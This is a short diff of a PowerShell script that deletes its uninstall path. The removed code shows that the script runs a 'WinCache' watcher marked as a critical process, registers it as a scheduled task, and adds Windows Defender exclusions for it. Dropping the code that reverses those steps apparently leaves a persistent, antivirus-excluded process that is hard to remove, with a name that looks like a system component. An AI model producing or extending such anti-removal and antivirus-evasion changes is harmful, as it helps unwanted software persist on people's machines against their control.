@@ -144,30 +144,6 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
-# ---------- uninstall / stop safe -------------------------------------------
-function Stop-Safe {
-    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) {
-        [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
-    }
-    Start-Sleep -Seconds 1 # Dar tiempo a Windows a procesar el cambio
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-}
-
-if ($Uninstall) {
-    Stop-Safe
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    try {
-        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
-        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
-    } catch {}
-    Write-Host '[+] Desinstalado correctamente.'
-    return
-}
-
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
